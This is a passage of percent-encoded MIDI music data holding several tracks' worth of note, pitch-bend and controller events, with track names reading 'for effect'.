1%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%78%90%50%5F%78%80%50%50%00%90%52%5F%78%80%52%50%82%68%90%4B%5F%78%80%4B%50%00%90%50%5F%78%80%50%50%00%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%90%52%5F%78%80%52%50%00%90%50%5F%78%80%50%50%78%90%52%5F%78%80%52%50%87%40%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%8B%20%91%54%5F%50%E1%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%81%54%50%00%E1%00%42%00%00%40%00%FF%2F%00%4D%54%72%6B%00%00%12%EC%00%FF%03%0A%66%6F%72%20%65%66%66%65%63%74%00%B2%64%00%00%65%00%00%06%0C%00%E2%00%40%00%B3%64%00%00%65%00%00%06%0C%00%E3%00%40%00%C2%53%00%C3%53%00%B2%07%58%00%B3%07%58%00%B2%0A%40%00%B3%0A%40%00%B2%5D%00%00%B3%5D%00%00%B2%5B%00%00%B3%5B%00%00%B2%5C%00%00%B3%5C%00%00%B2%5F%00%00%B3%5F%00%81%F0%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%85%50%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%87%40%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%85%50%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%FF%40%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%85%50%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%87%40%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%85%50%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%87%40%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%E5%20%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%32%5F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%35%5F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%35%5F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%32%5F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%35%5F%78%82%35%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%33%5F%78%82%33%50%00%92%32%3F%78%82%32%50%00%92%3E%5F%00%33%5F%78%82%3E%50%00%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%33%5F%78%82%33%50%00%92%35%5F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%36%5F%78%82%36%50%00%92%35%3F%78%82%35%50%00%92%41%5F%00%36%5F%78%82%41%50%00%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%00%92%36%5F%78%82%36%50%92%60%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%85%50%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%87%40%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%85%50%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%78%92%50%5F%78%82%50%50%00%92%52%5F%78%82%52%50%82%68%92%4B%5F%78%82%4B%50%00%92%50%5F%78%82%50%50%00%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%92%52%5F%78%82%52%50%00%92%50%5F%78%82%50%50%78%92%52%5F%78%82%52%50%87%40%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%8B%20%93%54%5F%50%E3%00%40%50%00%42%50%00%40%50%00%42%50%00%40%50%83%54%50%00%E3%00%42%00%00%40%00%FF%2F%00%4D%54%72%6B%00%00%0F%74%00%FF%03%0A%66%6F%72%20%65%66%66%65%63%74%00%B4%64%00%00%65%00%00%06%0C%00%E4%00%40%00%B5%64%00%00%65%00%00%06%0C%00%E5%00%40%00%C4%21%00%C5%21%00%B4%07%7F%00%B5%07%7F%00%B4%0A%40%00%B5%0A%40%00%B4%5D%00%00%B5%5D%00%00%B4%5B%00%00%B5%5B%00%00%B4%5C%00%00%B5%5C%00%00%B4%5F%00%00%B5%5F%00%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82%68%84%20%50%00%94%20%5F%83%60%84%20%50%84%58%94%23%5F%83%60%84%23%50%78%94%23%5F%81%70%84%23%50%00%94%21%5F%83%60%84%21%50%78%94%21%5F%78%84%21%50%00%94%23%5F%78%84%23%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%78%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%81%70%84%20%50%00%94%20%5F%83%60%84%20%50%81%70%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%85%50%94%20%5F%78%84%20%50%00%94%20%5F%83%60%84%20%50%00%94%20%5F%82